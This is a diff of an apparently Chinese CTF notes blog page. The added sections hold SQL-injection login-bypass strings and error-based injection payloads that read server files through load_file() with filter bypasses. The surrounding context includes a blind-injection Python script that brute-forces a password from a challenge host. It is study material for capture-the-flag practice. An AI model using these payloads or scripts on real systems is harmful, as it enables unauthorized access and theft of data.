@@ -103,7 +103,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql3.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql2.PNG">
-<meta property="og:updated_time" content="2018-03-16T10:31:51.127Z">
+<meta property="og:updated_time" content="2018-03-16T15:55:11.423Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="近期看的题目">
 <meta name="twitter:description" content="最近看师傅们的博客学到了好多">
@@ -371,6 +371,7 @@
 <p>话说这两个payload如果是``包着md会报错。。</p>
 <h3 id="Gopher协议攻击MySql"><a href="#Gopher协议攻击MySql" class="headerlink" title="Gopher协议攻击MySql"></a>Gopher协议攻击MySql</h3><p><a href="http://www.freebuf.com/articles/web/159342.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/159342.html</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
 <p>还在看。。。</p>
+<h3 id="sql测后台语句一把梭"><a href="#sql测后台语句一把梭" class="headerlink" title="sql测后台语句一把梭"></a>sql测后台语句一把梭</h3><p>username = admin’#<br>username = admin’ or 1=1#<br>username = admin’) or 1=1#<br>username = admin or 1=1#<br>username = admin” or 1=1#<br>username = admin”) or 1=1#</p>
 <h3 id="sql时间盲注-1"><a href="#sql时间盲注-1" class="headerlink" title="sql时间盲注-1"></a>sql时间盲注-1</h3><p>题目bak泄露读源码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">?php</div><div class="line"><span class="variable">$username</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'name'</span>]);</div><div class="line"><span class="variable">$sql</span> = <span class="string">"select * from user where username = '&#123;<span class="variable">$username</span>&#125;'"</span>;</div><div class="line"><span class="variable">$re</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</div><div class="line"><span class="variable">$rs</span> = mysqli_fetch_array(<span class="variable">$re</span>);</div><div class="line">// <span class="built_in">echo</span> <span class="variable">$rs</span>[<span class="string">'flag'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="variable">$username</span> . <span class="string">'&lt;br/&gt;'</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"因为出题人太懒了，所以现在没有任何功能"</span>;</div></pre></td></tr></table></figure>
 <p>sky大佬的脚本</p>
@@ -412,6 +413,18 @@
 <p>很明显要直接查password</p>
 <p>username=admin’^(ascii(substr((select(password))from(1)))&gt;127)#&amp;password=1 绕过</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line">import requests</div><div class="line">flag = <span class="string">""</span></div><div class="line">url = <span class="string">"http://118.89.219.210:49167/index.php"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(25,500):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</div><div class="line">                </div><div class="line">        <span class="comment">#payload ="admin'^(ascii(substr((select(database()))from(%s)))&gt;%s)#"%(i,j)</span></div><div class="line">        payload =<span class="string">"admin'^(ascii(substr((select(password))from(%s)))&gt;%s)#"</span>%(i,j)</div><div class="line"><span class="comment">#51b7a76d51e70b419f60d3473fb6f900 md5</span></div><div class="line">        </div><div class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">        s = requests.post(url,data=data).text</div><div class="line">        <span class="comment">#print "i:",i,"j:",j</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"username does not exist!"</span> not <span class="keyword">in</span> s:</div><div class="line">            flag += chr(j)</div><div class="line">            <span class="built_in">print</span> flag</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
+<h3 id="sql报错注入-读文件"><a href="#sql报错注入-读文件" class="headerlink" title="sql报错注入+读文件"></a>sql报错注入+读文件</h3><p>过滤了空格 可用/**/ %0a %0b绕过 过滤了单引号 可转十六进制 部分可用反引号``绕过</p>
+<p>load_file()函数读文件 采用updatexml()或者extractvalue()报错注入</p>
+<p>把题目中给的文件路径转为16进制 </p>
+<p>注意不管是updatexml()或者extractvalue()(这两格式上还是有点区别的)只能爆出32位 要结合 substr/substring/mid来使用 不过这题过滤了mid</p>
+<p>格式 updatexml(1,concat(0x7e,version(),0x7e),1)</p>
+<p>extractvalue()后面少个1</p>
+<p>先看下长度</p>
+<p>?id=1/<strong>/and/</strong>/extractvalue(1,concat(0x7e,(select/**/(length(load_file(0x2f7661722f746573742f6b65795f312e706870)))),0x7e))</p>
+<p>?id=1%0aand/<strong>/extractvalue(1,concat(0x7e,(select/</strong>/(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),1,32))),0x7e))</p>
+<p>?id=1%0aand/<strong>/extractvalue(1,concat(0x7e,(select/</strong>/(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),32,32))),0x7e))</p>
+<p>?id=1%0aand/<strong>/extractvalue(1,concat(0x7e,(select/</strong>/(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),63,32))),0x7e))</p>
+<p>这里每次加31否侧会漏一个。。。</p>
 
       
     </div>
@@ -610,7 +623,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端模板注入攻击-SSTI"><span class="nav-number">1.</span> <span class="nav-text">服务端模板注入攻击(SSTI)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gopher协议攻击MySql"><span class="nav-number">2.</span> <span class="nav-text">Gopher协议攻击MySql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql时间盲注-1"><span class="nav-number">3.</span> <span class="nav-text">sql时间盲注-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql时间盲注-2"><span class="nav-number">4.</span> <span class="nav-text">sql时间盲注-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-like"><span class="nav-number">5.</span> <span class="nav-text">sql-like</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端模板注入攻击-SSTI"><span class="nav-number">1.</span> <span class="nav-text">服务端模板注入攻击(SSTI)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gopher协议攻击MySql"><span class="nav-number">2.</span> <span class="nav-text">Gopher协议攻击MySql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql测后台语句一把梭"><span class="nav-number">3.</span> <span class="nav-text">sql测后台语句一把梭</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql时间盲注-1"><span class="nav-number">4.</span> <span class="nav-text">sql时间盲注-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql时间盲注-2"><span class="nav-number">5.</span> <span class="nav-text">sql时间盲注-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-like"><span class="nav-number">6.</span> <span class="nav-text">sql-like</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql报错注入-读文件"><span class="nav-number">7.</span> <span class="nav-text">sql报错注入+读文件</span></a></li></ol></div>
             
 
           </div>
